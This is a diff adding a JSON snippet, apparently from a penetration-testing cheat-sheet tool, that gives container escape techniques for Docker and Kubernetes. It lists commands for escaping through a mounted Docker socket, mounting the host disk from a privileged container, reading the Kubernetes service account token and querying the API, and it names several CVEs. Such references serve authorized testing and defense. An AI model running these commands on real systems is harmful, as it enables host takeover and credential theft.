@@ -1,0 +1,7 @@
+{
+  "name": "Container Escape",
+  "description": "Docker and Kubernetes container escape",
+  "category": "privesc",
+  "variables": [],
+  "content": "Container escape techniques.\n\n**Container detection :**\n```bash\ncat /proc/1/cgroup\nls -la /.dockerenv\nhostname\n```\n\n**Mounted Docker socket :**\n```bash\nls -la /var/run/docker.sock\n# If accessible :\ndocker run -v /:/host -it alpine chroot /host\n```\n\n**Privileged container :**\n```bash\n# Check capabilities\ncapsh --print\n\n# Mount host filesystem\nmkdir /mnt/host\nmount /dev/sda1 /mnt/host\n```\n\n**Kubernetes :**\n```bash\n# Service account token\ncat /var/run/secrets/kubernetes.io/serviceaccount/token\n\n# API access\ncurl -k https://kubernetes.default.svc/api/v1/namespaces\n```\n\n**Notable CVEs :**\n- CVE-2019-5736 (runc)\n- CVE-2020-15257 (containerd)\n- CVE-2022-0185 (kernel)"
+}
